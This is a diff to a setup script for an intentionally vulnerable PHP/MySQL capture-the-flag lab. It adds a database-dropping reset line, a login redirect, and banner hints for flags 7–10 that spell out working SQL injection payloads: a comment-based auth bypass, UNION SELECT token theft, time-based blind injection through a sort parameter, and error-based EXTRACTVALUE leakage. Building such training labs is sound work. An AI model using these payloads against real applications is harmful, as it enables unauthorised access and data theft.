@@ -171,6 +171,7 @@ mysql -u root -e "CREATE DATABASE IF NOT EXISTS \`${DB_NAME}\` CHARACTER SET utf
 # causing PHP's mysql_native_password to fail.  Drop + recreate to force the
 # correct plugin.
 mysql -u root -e "DROP USER IF EXISTS '${DB_USER}'@'localhost';" 2>&1
+mysql -u root -e "DROP DATABASE IF EXISTS \`${DB_NAME}\`;" 2>&1
 mysql -u root -e "CREATE USER '${DB_USER}'@'localhost' IDENTIFIED BY '${DB_PASS}';" 2>&1 || {
     err "Failed to create database user"
     exit 1
@@ -206,6 +207,12 @@ $proto = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 
 $host  = $_SERVER['HTTP_HOST'];
 $dir   = rtrim(dirname($_SERVER['SCRIPT_NAME']), '/\\');
 define('SITEURL', "$proto://$host$dir/");
+
+// Require login for all pages except login.php
+if (!isset($_SESSION['user']) && basename($_SERVER['PHP_SELF']) != 'login.php') {
+    header("Location: ".SITEURL."login.php");
+    exit;
+}
 CONFIGEOF
 
 sed -i "s/DB_USER_PLACEHOLDER/${DB_USER}/g" "${SITE_DIR}/config/constants.php"
@@ -282,6 +289,30 @@ echo "║      (SELECT SUBSTRING(token,N,1) FROM tbl_users        ║"
 echo "║      WHERE username='staff')='X',SLEEP(2),0)            ║"
 echo "║    → ~2s delay if char matches.                         ║"
 echo "║      Extract the staff token char by char.              ║"
+echo "║                                                         ║"
+echo "║                                                         ║"
+echo "║  Flag 7 (Easy  —  Auth Bypass)                          ║"
+echo "║    login.php                                            ║"
+echo "║    Username: admin' #                                   ║"
+echo "║    → logs in as admin without password, reveals flag.   ║"
+echo "║                                                         ║"
+echo "║  Flag 8 (Medium  —  UNION SELECT 2)                     ║"
+echo "║    profile.php?user_id=1 UNION SELECT 1,token,3         ║"
+echo "║      FROM tbl_users WHERE username='manager' -- -       ║"
+echo "║    → extracts the manager API token.                    ║"
+echo "║                                                         ║"
+echo "║  Flag 9 (Hard  —  ORDER BY SQLi)                        ║"
+echo "║    index.php?sort=(SELECT IF(SUBSTRING(secret_value,    ║"
+echo "║      1,1)='D',SLEEP(2),0) FROM tbl_secrets WHERE        ║"
+echo "║      secret_key='order_by_flag')                        ║"
+echo "║    → ~2s delay if char matches.                         ║"
+echo "║                                                         ║"
+echo "║  Flag 10 (Hard  —  INSERT SQLi)                         ║"
+echo "║    contact.php (Submit in Name field)                   ║"
+echo "║    test',(SELECT EXTRACTVALUE(1,CONCAT(0x7e,(SELECT     ║"
+echo "║      secret_value FROM tbl_secrets WHERE                ║"
+echo "║      secret_key='admin_email_flag')))),'message')-- -   ║"
+echo "║    → leaks the flag in a MySQL XPATH error.             ║"
 echo "║                                                         ║"
 echo "╚══════════════════════════════════════════════════════════╝"
 echo ""
